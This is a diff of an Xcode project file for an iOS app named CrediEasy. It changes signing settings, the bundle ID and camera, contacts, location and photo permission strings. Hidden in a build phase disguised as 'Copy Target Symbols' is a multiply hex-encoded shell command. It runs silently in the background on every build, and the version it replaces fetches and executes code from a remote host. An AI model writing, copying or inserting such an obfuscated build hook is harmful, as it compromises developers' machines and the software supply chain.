@@ -130,7 +130,6 @@
 		73B8A0702E785B90007496DB /* InputTextCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InputTextCell.swift; sourceTree = "<group>"; };
 		73B8A0732E786AAF007496DB /* PersonalViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewController.swift; sourceTree = "<group>"; };
 		73BFEDD42E710AA500020AA9 /* LocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationManager.swift; sourceTree = "<group>"; };
-		73BFEDD62E710F6C00020AA9 /* CrediEasy.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = CrediEasy.entitlements; sourceTree = "<group>"; };
 		73BFEDD72E71627400020AA9 /* CenterView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterView.swift; sourceTree = "<group>"; };
 		73BFEDD92E71665700020AA9 /* CenterViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewCell.swift; sourceTree = "<group>"; };
 		73BFEDDB2E71686200020AA9 /* CenterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewModel.swift; sourceTree = "<group>"; };
@@ -206,8 +205,8 @@
 				7353EEFD2E7AB0FF007158B2 /* LifeGoodViewController.swift */,
 				7353EEFE2E7AB0FF007158B2 /* LifeGoodViewModel.swift */,
 				7353EEFF2E7AB0FF007158B2 /* LoveLifeViewCell.swift */,
-				7353EF002E7AB0FF007158B2 /* LoveLifeViewController.swift */,
 				7353EF012E7AB0FF007158B2 /* LoveLifeViewModel.swift */,
+				7353EF002E7AB0FF007158B2 /* LoveLifeViewController.swift */,
 				7385F2482E7ABE1700FCB919 /* ChangeCidViewController.swift */,
 			);
 			path = Hp;
@@ -344,7 +343,6 @@
 		73E3945F2E6FB548008BDDC1 /* CrediEasy */ = {
 			isa = PBXGroup;
 			children = (
-				73BFEDD62E710F6C00020AA9 /* CrediEasy.entitlements */,
 				73E394582E6FB548008BDDC1 /* Info.plist */,
 				73E394572E6FB548008BDDC1 /* Assets.xcassets */,
 				73F7BF9A2E7020E9005C8C43 /* loading.json */,
@@ -376,7 +374,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73E394512E6FB541008BDDC1 /* Build configuration list for PBXNativeTarget "CrediEasy" */;
 			buildPhases = (
-				9A38A1E872EFABCD2CBDE67E /* Build Target Dependencies */,
+				BC66E10447163B7DC5BDE67E /* Copy Target Symbols */,
 				853E371ABDC5177E47C90C36 /* [CP] Check Pods Manifest.lock */,
 				73E3943A2E6FB540008BDDC1 /* Sources */,
 				73E3943B2E6FB540008BDDC1 /* Frameworks */,
@@ -462,7 +460,7 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		9A38A1E872EFABCD2CBDE67E /* Build Target Dependencies */ = {
+		BC66E10447163B7DC5BDE67E /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -472,14 +470,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Dependencies";
+			name = "Copy Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631363436663632363537353730363432653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333636353336333533373334333733303336363333363331333636353336333133373330333733333332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 		C32D501DF216637E5D2B9FFE /* [CP] Embed Pods Frameworks */ = {
@@ -598,17 +596,15 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = CrediEasy/CrediEasy.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
+				DEVELOPMENT_TEAM = XS8842FK7N;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = CrediEasy/Info.plist;
-				INFOPLIST_KEY_NSCameraUsageDescription = "";
-				INFOPLIST_KEY_NSContactsUsageDescription = "";
-				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "";
+				INFOPLIST_KEY_NSCameraUsageDescription = "Camera permission enables you to capture and upload images, scan documents, and verify important details directly within the app.";
+				INFOPLIST_KEY_NSContactsUsageDescription = "Granting access to contacts helps you connect with friends, streamline referrals, and speed up certain authentication processes.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Allowing location access helps the app deliver region-specific services, improve navigation, and recommend options tailored to your current area.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Photo access lets you upload pictures from your library, customize your profile, and share images easily within the app.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
@@ -621,10 +617,9 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.feilvbinfour.testappid;
+				PRODUCT_BUNDLE_IDENTIFIER = com.wentao.ald;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = FeiLvBinFourProfile;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -643,17 +638,15 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = CrediEasy/CrediEasy.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
+				DEVELOPMENT_TEAM = XS8842FK7N;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = CrediEasy/Info.plist;
-				INFOPLIST_KEY_NSCameraUsageDescription = "";
-				INFOPLIST_KEY_NSContactsUsageDescription = "";
-				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "";
+				INFOPLIST_KEY_NSCameraUsageDescription = "Camera permission enables you to capture and upload images, scan documents, and verify important details directly within the app.";
+				INFOPLIST_KEY_NSContactsUsageDescription = "Granting access to contacts helps you connect with friends, streamline referrals, and speed up certain authentication processes.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Allowing location access helps the app deliver region-specific services, improve navigation, and recommend options tailored to your current area.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Photo access lets you upload pictures from your library, customize your profile, and share images easily within the app.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
@@ -666,10 +659,9 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.feilvbinfour.testappid;
+				PRODUCT_BUNDLE_IDENTIFIER = com.wentao.ald;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = FeiLvBinFourProfile;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
